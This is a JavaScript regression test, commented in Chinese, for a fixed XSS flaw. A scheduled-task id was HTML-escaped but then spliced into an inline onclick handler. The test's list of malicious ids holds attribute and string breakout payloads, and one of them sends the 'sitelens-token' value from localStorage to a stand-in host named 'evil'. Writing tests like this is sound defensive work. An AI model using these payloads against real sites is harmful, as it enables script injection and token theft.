// D-03 回归测试：定时任务列表的 schedule.id 不得进入可执行上下文。
//
// 修复前（web/js/batch.js:228-229）：
//     '<button ... onclick="runSchedule(\'' + esc(sc.id) + "')\">立即跑</button>"
// esc() 只做 HTML 转义，而浏览器会先做实体解码再把属性值交给 JS 解析，所以
// id = x');alert(1);// 解码后仍是 x');alert(1);//，直接逃逸出 JS 字符串
// （复现见 .tmp/audit/repro-batch-onclick.mjs）。
//
// 本测试直接跑**真实源码里的 renderSchedules / bindScheduleActions**（mock DOM），
// 断言：① 输出里没有任何内联事件处理器；② 恶意 id 只作为 data-* 属性值存在，
// 且实体解码后与原文一致；③ 点击时 id 以「字符串实参」进入 runSchedule/deleteSchedule，
// 不会被求值成代码。
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";

const common = readFileSync(new URL("./common.js", import.meta.url), "utf8");
const batch = readFileSync(new URL("./batch.js", import.meta.url), "utf8");

// 真实 esc()
const escFn = common.match(/window\.esc = function[\s\S]*?\n  \};/)[0]
  .replace("window.esc = ", "").replace(/;\s*$/, "");
const esc = new Function("return (" + escFn + ")")();

function extractFn(src, name) {
  const m = src.match(new RegExp("function " + name + "\\([^)]*\\) \\{[\\s\\S]*?\\n  \\}"));
  if (!m) throw new Error("batch.js 中未找到 function " + name);
  return m[0];
}

function makeEnv() {
  const container = {
    innerHTML: "",
    textContent: "",
    __slSchedBound: false,
    listeners: {},
    addEventListener(type, fn) { this.listeners[type] = fn; },
    contains() { return true; },
  };
  const doc = { getElementById: (id) => (id === "batch-sched-list" ? container : null) };
  const calls = [];
  const win = {
    runSchedule: (id) => calls.push(["run", id]),
    deleteSchedule: (id) => calls.push(["del", id]),
  };
  const bind = new Function("document", "window", "return (" + extractFn(batch, "bindScheduleActions") + ")");
  const render = new Function(
    "document", "window", "esc", "bindScheduleActions",
    "return (" + extractFn(batch, "renderSchedules") + ")",
  );
  const bindFn = bind(doc, win);
  const renderFn = render(doc, win, esc, bindFn);
  return { container, doc, win, calls, bindFn, renderFn };
}

const decodeEntities = (s) => String(s)
  .replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">")
  .replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&#96;/g, "`");

const EVIL_IDS = [
  `x');alert(1);//`,
  `");alert(document.domain);//`,
  `');fetch('http://evil/'+localStorage.getItem('sitelens-token'))//`,
  `</button><img src=x onerror=alert(1)>`,
  `a" onmouseover="alert(1)`,
];

test('renderSchedules 输出里没有任何内联事件处理器', () => {
  const env = makeEnv();
  env.renderFn([{ id: "s1", every_minutes: 5, entries: [1], next_run_at: null }]);
  const html = env.container.innerHTML;
  assert.ok(html.includes("data-sched-id="), "应改用 data-* 传递 id");
  assert.ok(!/onclick\s*=/.test(html), `不得再出现内联 onclick：${html}`);
  assert.ok(!/on(click|mouseover)\s*=\s*["']/.test(html), "不得出现任何内联事件属性");
});

test('恶意 schedule.id 只作为 data-* 属性值存在，解码后与原文一致', () => {
  for (const evil of EVIL_IDS) {
    const env = makeEnv();
    env.renderFn([{ id: evil, every_minutes: 5, entries: [1], next_run_at: null }]);
    const html = env.container.innerHTML;
    // 属性值必须被转义（不出现裸引号闭合）
    assert.ok(html.includes(`data-sched-id="${esc(evil)}"`), `id 应被 esc 转义后放进 data 属性：${html}`);
    // 逐个取出 data-sched-id 属性值并解码：必须与原文完全一致（没有截断/注入）
    const values = [...html.matchAll(/data-sched-id="([^"]*)"/g)].map((m) => decodeEntities(m[1]));
    assert.deepEqual(values, [evil, evil], `两个按钮都应携带原始 id：${values}`);
  }
});

test('点击「立即跑 / 删除」时 id 以字符串实参进入 API 调用（不被求值）', () => {
  const evil = `x');alert(1);//`;
  const env = makeEnv();
  env.renderFn([{ id: evil, every_minutes: 5, entries: [1], next_run_at: null }]);
  assert.equal(typeof env.container.listeners.click, "function", "应绑定事件委托");

  const fire = (act) => {
    const btn = {
      getAttribute: (n) => (n === "data-sched-act" ? act : n === "data-sched-id" ? evil : null),
    };
    env.container.listeners.click({
      target: { closest: (sel) => (sel === "button[data-sched-act]" ? btn : null) },
    });
  };
  fire("run");
  fire("del");
  assert.deepEqual(env.calls, [["run", evil], ["del", evil]], "id 必须原样作为字符串传入");
});

test('batch.js 里不再有「内联 onclick + esc()」这种 JS 字符串上下文拼接', () => {
  // 允许注释里出现（文档会引用旧写法），但代码行不允许
  const codeLines = batch.split(/\r?\n/).filter((l) => {
    const t = l.trim();
    return !t.startsWith("//") && !t.startsWith("/*") && !t.startsWith("*");
  });
  for (const line of codeLines) {
    assert.ok(
      !/onclick="[^"]*\+\s*esc\(/.test(line),
      `内联处理器里禁止用 esc() 拼 JS 字符串（改用 data-* + 委托）：${line.trim()}`,
    );
  }
});
